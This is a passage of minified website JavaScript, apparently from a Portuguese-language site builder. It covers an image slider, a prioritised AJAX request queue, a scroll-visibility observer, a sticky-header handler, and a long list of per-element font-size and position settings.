                            ultimo.style.transition = "0s", ultimo.classList.remove("ativo"), ultimo.style.opacity = 0, ultimo.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[gsi_instancias[id].imagens_view] + ",0)", ultimo = instancia.querySelector("#" + gsi_instancias[id].imagens_ordem[0]), ultimo.style.transition = "0s", ultimo.classList.remove("ativo"), ultimo.style.opacity = 0, ultimo.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[-1] + ",0)", gsi_instancias[id].touch_mover = !1
                        }), tempo)
                    }
                    instancia.querySelector(".gsi_imagens").style.pointerEvents = "", gsi_instancias[id].touch_ativo = !1, gsi_instancias[id].touch_posicao_inicio = 0, gsi_instancias[id].touch_posicao_movendo = 0, proximo && gsi_instancias[id].imagens.length > gsi_instancias[id].imagens_view && (proximo.style.pointerEvents = "", proximo.style.opacity = ""), anterior && gsi_instancias[id].imagens.length > gsi_instancias[id].imagens_view && (anterior.style.pointerEvents = "", anterior.style.opacity = "")
                }
                "touch" != acao && (gsi_instancias[id].slide = setTimeout((function() {
                    if (GSlideImage.imagens_ordem(id), "proximo" == acao) {
                        let ultimo = instancia.querySelector("#" + gsi_instancias[id].imagens_ordem[gsi_instancias[id].imagens_view + 1]);
                        ultimo && (ultimo.style.transition = "0s linear", ultimo.classList.remove("ativo"), ultimo.style.opacity = 0, ultimo.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[gsi_instancias[id].imagens_view] + ", 0)"), gsi_instancias[id].imagens_ordem[0] != gsi_instancias[id].imagens_ordem[gsi_instancias[id].imagens_view + 1] && (ultimo = instancia.querySelector("#" + gsi_instancias[id].imagens_ordem[0]), ultimo && (ultimo.style.transition = "0s linear", ultimo.classList.remove("ativo"), ultimo.style.opacity = 0, ultimo.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[-1] + ", 0)"))
                    } else {
                        let ultimo = instancia.querySelector("#" + gsi_instancias[id].imagens_ordem[gsi_instancias[id].imagens_view + 1]);
                        ultimo && (ultimo.style.transition = "0s linear", ultimo.classList.remove("ativo"), ultimo.style.opacity = 0), gsi_instancias[id].imagens_ordem[0] != gsi_instancias[id].imagens_ordem[gsi_instancias[id].imagens_view + 1] ? (ultimo && (ultimo.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[gsi_instancias[id].imagens_view] + ", 0)"), ultimo = instancia.querySelector("#" + gsi_instancias[id].imagens_ordem[0]), ultimo && (ultimo.style.transition = "0s linear", ultimo.classList.remove("ativo"), ultimo.style.opacity = 0, ultimo.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[-1] + ", 0)")) : ultimo && (ultimo.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[-1] + ", 0)")
                    }
                    proximo && gsi_instancias[id].imagens.length > gsi_instancias[id].imagens_view && (proximo.style.pointerEvents = ""), anterior && gsi_instancias[id].imagens.length > gsi_instancias[id].imagens_view && (anterior.style.pointerEvents = ""), instancia.querySelector(".gsi_imagens").style.pointerEvents = ""
                }), tempo_touch)), gsi_instancias[id].autoplay && (gsi_intervalo[id] = setInterval((function() {
                    GSlideImage.acao(id)
                }), 4e3))
            } else gsi_instancias.hasOwnProperty(id) && gsi_instancias[id].autoplay && (clearInterval(gsi_intervalo[id]), delete gsi_intervalo[id])
        }
    };
$((function() {
    GSlideImage.iniciar(), window.addEventListener("resize", (function(e) {
        e.preventDefault(), e.stopPropagation();
        var altura = window.innerHeight,
            largura = window.innerWidth;
        timeout_resize_slider && (clearTimeout(timeout_resize_slider), timeout_resize_slider = null), timeout_resize_slider = setTimeout((function() {
            if (altura == window.innerHeight && largura == window.innerWidth) {
                let instancias = document.querySelectorAll(".gsi");
                if (instancias)
                    for (let i = 0; i < instancias.length; i++) "" != instancias[i].getAttribute("id") && null != instancias[i].getAttribute("id") && null != instancias[i].getAttribute("id") ? GSlideImage.imagens(instancias[i].getAttribute("id"), !0) : GSlideImage.iniciar(instancias[i].closest(".c, .conteudo").getAttribute("id"))
            }
        }), 500)
    }))
}));
var gqa_status = !1,
    gqa_fila = [],
    gqa_executando = !1;

function ControlarFilaGQA() {
    gqa_executando && clearTimeout(gqa_executando), gqa_executando = setInterval((function() {
        ExecutarFilaGQA()
    }), document.hidden ? 8e3 : 100)
}

function AdicionarFilaGQA(parametros) {
    if (0 == parametros.hasOwnProperty("verbo") && (parametros.verbo = "POST"), 0 == parametros.hasOwnProperty("url")) return !1;
    0 == parametros.hasOwnProperty("uri") ? parametros.uri = "" : "object" != typeof parametros.uri && "array" != typeof parametros.uri || (parametros.uri = FormatarUriGQA(parametros.uri)), 0 == parametros.hasOwnProperty("extensao") && (parametros.extensao = "json"), 0 == parametros.hasOwnProperty("prioridade") && (parametros.prioridade = "baixa"), 0 == parametros.hasOwnProperty("carregar") && (parametros.carregar = !1), 0 == parametros.hasOwnProperty("timeout") && (parametros.timeout = 1e4), "alta" == parametros.prioridade ? EnviarAjaxGQA(parametros) : "media" == parametros.prioridade ? gqa_fila.unshift([parametros]) : "baixa" == parametros.prioridade && gqa_fila.push([parametros])
}

function ExecutarFilaGQA() {
    if (0 == gqa_status && gqa_fila.length) {
        var proximo = gqa_fila.shift();
        gqa_status = !0, EnviarAjaxGQA(proximo[0])
    }
}

function EnviarAjaxGQA(parametros) {
    if (0 == parametros.hasOwnProperty("verbo") && (parametros.verbo = "POST"), 0 == parametros.hasOwnProperty("url")) return !1;
    if (0 == parametros.hasOwnProperty("uri") && (parametros.uri = ""), 0 == parametros.hasOwnProperty("extensao") && (parametros.extensao = "json"), 0 == parametros.hasOwnProperty("prioridade") && (parametros.prioridade = "baixa"), 0 == parametros.hasOwnProperty("carregar") && (parametros.carregar = !1), 0 == parametros.hasOwnProperty("timeout") && (parametros.timeout = 1e4), 0 == parametros.hasOwnProperty("externo") && (parametros.externo = !1), 0 == parametros.hasOwnProperty("funcao_erro") && (parametros.funcao_erro = ""), 0 == parametros.hasOwnProperty("funcao_sucesso") && (parametros.funcao_sucesso = ""), 1 == parametros.carregar && GLoading.carregar({
            ativar: !0
        }), "POST" == parametros.verbo) var url = parametros.url,
        dados = parametros.uri;
    else {
        if (parametros.uri) url = parametros.url + "?" + parametros.uri;
        else url = parametros.url;
        dados = ""
    }
    var requisicao = new XMLHttpRequest;
    requisicao.open(parametros.verbo, url, !0), requisicao.timeout = parametros.timeout, parametros.extensao && (requisicao.responseType = parametros.extensao), requisicao.withCredentials = !0, requisicao.overrideMimeType("application/" + parametros.extensao), "POST" == parametros.verbo && (parametros.externo ? (requisicao.withCredentials = !1, requisicao.setRequestHeader("Content-Type", "application/json")) : requisicao.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")), parametros.externo && (requisicao.setRequestHeader("Access-Control-Allow-Methods", "POST"), requisicao.setRequestHeader("Access-Control-Allow-Headers", "*"), requisicao.setRequestHeader("Access-Control-Allow-Origin", "*")), requisicao.onreadystatechange = function() {
        if (4 == this.readyState)
            if (200 == this.status) {
                if ("json" == this.responseType) var resposta = this.response;
                else if ("text" == this.responseType || "" == this.responseType) resposta = this.responseText;
                else resposta = this.response;
                parametros.funcao_sucesso && parametros.funcao_sucesso(resposta), GLoading.carregar({
                    ativar: !1
                }), gqa_status = !1
            } else parametros.funcao_erro && parametros.funcao_erro(this), GLoading.carregar({
                ativar: !1
            }), gqa_status = !1
    }, requisicao.send(dados), requisicao = null
}

function FormatarUriGQA(post, prefixo) {
    var post_chave, post_valor, retorno = [];
    for (var p in post) post.hasOwnProperty(p) && (post_chave = ~p.indexOf("[") ? prefixo ? prefixo + "[" + p.substring(0, p.indexOf("[")) + "]" + p.substring(p.indexOf("[")) : p : prefixo ? prefixo + "[" + p + "]" : p, post_valor = post[p], retorno.push("object" == typeof post_valor ? FormatarUriGQA(post_valor, post_chave) : encodeURIComponent(post_chave) + "=" + encodeURIComponent(post_valor)));
    return retorno.join("&")
}
$((function() {
    document.addEventListener && document.addEventListener("visibilitychange", ControlarFilaGQA), ControlarFilaGQA()
}));
var go_elementos = [],
    GObserver = {
        iniciar: function() {
            window.addEventListener("resize", (function() {
                GObserver.observar(!0)
            }), !1), window.addEventListener("scroll", (function() {
                GObserver.observar(!0)
            }), !1)
        },
        instalar: function(configuracao) {
            if (0 == configuracao.hasOwnProperty("elemento") && (configuracao.elemento = ""), 0 == configuracao.hasOwnProperty("antecipacao") && (configuracao.antecipacao = 0), 0 == configuracao.hasOwnProperty("executar") && (configuracao.executar = ""), "" != configuracao.elemento) {
                var elementos = document.querySelectorAll(configuracao.elemento);
                if (elementos.length) {
                    for (var i = 0; i < elementos.length; i++)
                        if (elementos[i].id) {
                            var instalar = {
                                elemento: "#" + elementos[i].id,
                                antecipacao: configuracao.antecipacao,
                                executar: configuracao.executar
                            };
                            go_elementos.push(instalar)
                        } GObserver.observar(!1)
                }
            }
        },
        observar: function(antecipacao) {
            if (go_elementos.length)
                for (var janela_top = window.scrollY || window.pageYOffset, janela_bottom = janela_top + window.innerHeight, i = 0; i < go_elementos.length; i++) {
                    var antecipar = 1 == antecipacao ? go_elementos[i].antecipacao : 0,
                        elemento = document.querySelector(go_elementos[i].elemento);
                    if (null != elemento && "none" !== window.getComputedStyle(elemento).display) {
                        var elemento_top = elemento.getBoundingClientRect().top + janela_top;
                        if (elemento_top + elemento.clientHeight >= janela_top && elemento_top - antecipar <= janela_bottom) {
                            go_elementos[index = i].executar(document.querySelector(go_elementos[index].elemento)), go_elementos.splice(i, 1), this.observar(antecipacao);
                            break
                        }
                    }
                }
            var index
        }
    };

function InserirScriptsInline() {
    window.getCrawler() || setTimeout((function() {}), 150), window.getCrawler() || window.addEventListener("scroll", (function() {
        (window.pageYOffset || window.scrollY) > 0 ? ($("#site div.gpc-b:nth-child(1)").css({
            position: "fixed",
            "z-index": "2000"
        }), $("#site div.gpc-b:nth-child(2)").css({
            "margin-top": $("#site div.gpc-b:nth-child(1)").height() + "px"
        })) : ($("#site div.gpc-b:nth-child(1)").css({
            position: "initial",
            "z-index": "10000"
        }), $("#site div.gpc-b:nth-child(2)").css({
            "margin-top": "0px"
        }))
    }), !1)
}
GObserver.iniciar(), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce5363580ac086350848: {
        fs: "14",
        lh: "1.3"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce5363580ac086350848: {
        desktop: 20.5,
        mobile: 126.563
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536358167345968390: {
        desktop: 7.2656,
        mobile: 9.89062
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce5363581dc301961877: {
        fs: "15",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce5363581dc301961877: {
        desktop: 25,
        mobile: 7.73438
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce53635827f941160625: {
        fs: "25",
        lh: "1"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce53635827f941160625: {
        desktop: 28.7188,
        mobile: 10.2344
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_91372: {
        fs: "15",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_91372: {
        desktop: 25,
        mobile: 7.73438
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce5363575d7506824076: {
        fs: "16.3732",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce5363575d7506824076: {
        desktop: 367.093,
        mobile: 244.587
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536357868682349537: {
        fs: "35",
        lh: "1.3"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536357868682349537: {
        desktop: 203.449,
        mobile: 108.094
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce5363578a6828497203: {
        fs: "16.3732",
        lh: "1.3"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce5363578a6828497203: {
        desktop: 439.562,
        mobile: 587.188
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536357942300662859: {
        fs: "19.4431",
        lh: "1.7000015429638"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536357942300662859: {
        desktop: 104.312,
        mobile: 9
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536357a19237855066: {
        fs: "49",
        lh: "1"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536357a19237855066: {
        desktop: 554,
        mobile: 666.25
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802352672547987: {
        desktop: 104.297,
        mobile: 310.047
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536357a67792937248: {
        fs: "15",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536357a67792937248: {
        desktop: 78,
        mobile: 99
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536357aab748760632: {
        fs: "35",
        lh: "1.3"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536357aab748760632: {
        desktop: 0,
        mobile: 0
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536357aea931743524: {
        desktop: 168.5,
        mobile: 163.125
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536357b2b172198081: {
        fs: "9.62064",
        lh: "1.7"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536357b2b172198081: {
        desktop: 253,
        mobile: 224.387
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536357b79952333704: {
        fs: "50.6349",
        lh: "1.6"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536357b79952333704: {
        desktop: 134,
        mobile: 147.45
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536357c0e921220117: {
        desktop: 167.5,
        mobile: 313.488
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536357cdb776630073: {
        fs: "14.2067",
        lh: "1.6"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536357cdb776630073: {
        desktop: 195.516,
        mobile: 330.963
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536357d85850696167: {
        desktop: 532.5,
        mobile: 453.45
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536357e3b374162170: {
        fs: "9",
        lh: "1.7"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536357e3b374162170: {
        desktop: 616.219,
        mobile: 497.025
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536357e8d677188231: {
        fs: "14.6558",
        lh: "1.6"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536357e8d677188231: {
        desktop: 561.797,
        mobile: 467.462
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536357f46361865772: {
        desktop: 531,
        mobile: 594.375
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536357f94397421219: {
        fs: "9",
        lh: "1.7"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536357f94397421219: {
        desktop: 616.219,
        mobile: 636.05
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536357fe6655079306: {
        fs: "14.0196",
        lh: "1.6"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536357fe6655079306: {
        desktop: 561.797,
        mobile: 607
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802650144697696: {
        desktop: 161,
        mobile: 154.025
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_86154: {
        fs: "47.3556",
        lh: "1.6"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_86154: {
        desktop: 134,
        mobile: 298.812
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_62342: {
        fs: "15.1905",
        lh: "1.6"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_62342: {
        desktop: 193.797,
        mobile: 182.875
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_39762: {
        fs: "9",
        lh: "1.7"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_39762: {
        desktop: 243.516,
        mobile: 368.013
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802732601417497: {
        desktop: 160.5,
        mobile: 303.263
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_99909: {
        fs: "48.8528",
        lh: "1.6"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_99909: {
        desktop: 500.5,
        mobile: 438.913
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170813248167784167: {
        desktop: 523.469,
        mobile: 439.25
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_24226: {
        fs: "46.7317",
        lh: "1.6"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_24226: {
        desktop: 500.5,
        mobile: 576.65
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170813292258902575: {
        desktop: 527,
        mobile: 579.425
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_171052494842407816: {
        desktop: 346,
        mobile: 827.797
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_171052498029336125: {
        desktop: 432.5,
        mobile: 778.828
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_13229: {
        desktop: 707.609,
        mobile: 747.828
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_77102: {
        desktop: 432.5,
        mobile: 658.812
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_171068673242906996: {
        desktop: 818,
        mobile: 230.484
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_171068675176650159_m: {
        desktop: 244,
        mobile: 224.375
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_02863_m: {
        desktop: 264,
        mobile: 362.891
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_98373: {
        desktop: 838,
        mobile: 369
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_02666_m: {
        desktop: 4,
        mobile: 512.375
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_82973_m: {
        desktop: 284,
        mobile: 508.375
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce5363582ec815165119: {
        fs: "15",
        lh: "1.7"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce5363582ec815165119: {
        desktop: 135.312,
        mobile: 1135.59
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce53635835e073590256: {
        fs: "22",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce53635835e073590256: {
        desktop: 33.5,
        mobile: 620.562
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce5363583ba280049585: {
        desktop: 428.5,
        mobile: 16.55
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce53635847a934738819: {
        fs: "22",
        lh: "1"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce53635847a934738819: {
        desktop: 444,
        mobile: 28.25
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536358548671803581: {
        fs: "13.5619",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536358548671803581: {
        desktop: 56.5,
        mobile: 701.588
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce5363586a4351527923: {
        desktop: 67.5,
        mobile: 715.425
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce53635885f549995978: {
        desktop: 301.5,
        mobile: 1017.17
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce5363588dc755259163: {
        desktop: 44.5,
        mobile: 690.588
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce53635895c527699755: {
        desktop: 108.5,
        mobile: 773.675
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536358a48774938278: {
        desktop: 173.5,
        mobile: 854.425
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536358acc631115511: {
        desktop: 237.5,
        mobile: 935.787
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_26342: {
        desktop: 301.5,
        mobile: 1073.09
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_82109: {
        desktop: 366.672,
        mobile: 1073.08
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170813522934309104: {
        desktop: 558.5,
        mobile: 86.175
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170813524919371285: {
        desktop: 558.5,
        mobile: 86.175
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170813526799714183: {
        desktop: 558.563,
        mobile: 149.588
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170813531403815363: {
        desktop: 558.547,
        mobile: 208.35
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170813535149860236: {
        desktop: 558.469,
        mobile: 212.838
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170813539692291992: {
        desktop: 558.469,
        mobile: 278.025
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170813543193729014: {
        desktop: 627.422,
        mobile: 347.8
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170813550680794045: {
        desktop: 627.422,
        mobile: 347.8
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170813556721295282: {
        desktop: 627.922,
        mobile: 412.125
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170813559554488781: {
        desktop: 627.422,
        mobile: 483.675
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170813562138878619: {
        desktop: 627.422,
        mobile: 483.675
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170813563631107033: {
        desktop: 627.422,
        mobile: 553.488
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170813565905956355: {
        desktop: 627.344,
        mobile: 553.438
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_09226: {
        fs: "49",
        lh: "1"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_09226: {
        desktop: 716.5,
        mobile: 1388.08
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_171068675176650159_d: {
        desktop: 244,
        mobile: 224.375
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_02863_d: {
        desktop: 264,
        mobile: 362.891
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_02666_d: {
        desktop: 4,
        mobile: 512.375
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_82973_d: {
        desktop: 284,
        mobile: 508.375
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce5363598af707814012: {
        fs: "16",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce5363598af707814012: {
        desktop: 420.2,
        mobile: 372.766
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce53635998e362475910: {
        fs: "16",
        lh: "1.6"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce53635998e362475910: {
        desktop: 381.2,
        mobile: 147.175
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536359a6f816673433: {
        desktop: 696.5,
        mobile: 1612.88
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536359b01207826589: {
        fs: "17",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536359b01207826589: {
        desktop: 790.984,
        mobile: 1613.88
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536359bb8635430995: {
        fs: "24",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536359bb8635430995: {
        desktop: 757.406,
        mobile: 1534.75
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536359c58369939928: {
        fs: "11.9732",
        lh: "1.3"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536359c58369939928: {
        desktop: 762.469,
        mobile: 1689.88
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536359fba796494221: {
        fs: "16",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536359fba796494221: {
        desktop: 419.2,
        mobile: 855.938
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce53635a06c706680481: {
        fs: "16",
        lh: "1.6"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce53635a06c706680481: {
        desktop: 380.388,
        mobile: 595.75
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce53635a30f445959614: {
        fs: "16",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce53635a30f445959614: {
        desktop: 419.2,
        mobile: 1342.75
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce53635a3c9407173892: {
        fs: "16",
        lh: "1.6"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce53635a3c9407173892: {
        desktop: 380.372,
        mobile: 1102.75
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce53635a609010600134: {
        fs: "16",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce53635a609010600134: {
        desktop: 67.1875,
        mobile: 43.8
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce53635a734957458116: {
        fs: "22",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce53635a734957458116: {
        desktop: 0,
        mobile: .002445
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170813847266215703: {
        desktop: 153.2,
        mobile: 172.766
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_31615: {
        desktop: 153.2,
        mobile: 643.95
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_95807: {
        desktop: 153.2,
        mobile: 1122.75
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_37211: {
        fs: "49",
        lh: "1"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_37211: {
        desktop: 611.5,
        mobile: 546.75
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_15727: {
        fs: "49",
        lh: "1"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_15727: {
        desktop: 631.5,
        mobile: 1052.75
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce53635ab9f358905135: {
        fs: "16",
        lh: "1.7"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce53635ab9f358905135: {
        desktop: 34.5,
        mobile: 147
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce53635acee427202357: {
        fs: "35",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce53635acee427202357: {
        desktop: 31.5,
        mobile: 7.40625
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce53635ae32950079559: {
        desktop: 10.5,
        mobile: 309.688
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce53635af21803607194: {
        fs: "14.9222",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce53635af21803607194: {
        desktop: 131.094,
        mobile: 354.859
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce53635afe5014602816: {
        fs: "11.4111",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce53635afe5014602816: {
        desktop: 155.25,
        mobile: 384.703
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_91473: {
        fs: "49",
        lh: "1"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_91473: {
        desktop: 191.5,
        mobile: 440.938
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536358d61584721669: {
        desktop: 356.734,
        mobile: 334.094
    }
}), elementos_css = Object.assign(elementos_css, {
